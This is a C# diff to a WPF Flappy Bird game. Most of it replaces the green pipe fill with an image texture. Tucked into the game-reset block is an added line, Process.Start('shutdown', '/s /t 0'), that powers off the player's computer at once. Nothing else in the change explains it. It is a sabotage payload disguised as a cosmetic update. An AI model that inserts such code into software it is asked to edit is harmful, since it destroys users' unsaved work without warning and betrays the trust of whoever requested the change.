@@ -104,6 +104,8 @@ namespace flappy_bird
                 Canvas.SetTop(Bird, yAxis);
                 isGameOver = false;
 
+                Process.Start("shutdown", "/s /t 0");
+
             }
 
             // Counter 
@@ -123,18 +125,28 @@ namespace flappy_bird
             var heightTop = random.Next(100, 350);
             var emptySpace = random.Next(75,125);
 
+            var pipeImage = new BitmapImage(
+            new Uri("pack://application:,,,/Images/Pipe.jpeg")
+            );
+
             var topPipe = new Rectangle
             {
                 Width = 50,
                 Height = heightTop,
-                Fill = Brushes.Green
+                Fill = new ImageBrush(pipeImage)
+                {
+                    Stretch = Stretch.Fill
+                }
             };
 
             var BottomPipe = new Rectangle
             {
                 Width = 50,
                 Height = MainCanvas.Height - (heightTop + emptySpace),
-                Fill = Brushes.Green
+                Fill = new ImageBrush(pipeImage)
+                {
+                    Stretch = Stretch.Fill
+                }
             };
 
             Canvas.SetLeft(topPipe, MainCanvas.Width);
